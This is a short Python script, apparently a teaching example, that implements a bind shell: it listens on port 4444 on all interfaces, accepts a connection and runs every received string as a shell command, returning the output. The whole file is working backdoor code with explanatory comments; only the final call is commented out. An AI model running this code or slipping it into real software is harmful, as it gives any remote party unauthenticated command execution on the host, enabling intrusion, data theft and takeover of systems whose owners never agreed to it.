import socket
import subprocess

def bind_shell(port=4444):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # CRUCIAL
    
    server.bind(("0.0.0.0", port))  # 0.0.0.0 listens on all interfaces
    server.listen(5)               # Max 5 queued connections
    print(f"[*] Listening on port {port}...")
    
    client, addr = server.accept() # BLOCKS until a connection arrives
    print(f"[+] Connection from {addr[0]}:{addr[1]}")
    
    while True:
        command = client.recv(4096).decode().strip()
        if command.lower() == "exit":
            break
        try:
            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            result = output.stdout + output.stderr
            if not result:
                result = "[*] Command executed (no output)"
            client.sendall(result.encode())
        except Exception as e:
            client.sendall(str(e).encode())
    
    client.close()
    server.close()

# bind_shell()  # Uncomment to listen for incoming connections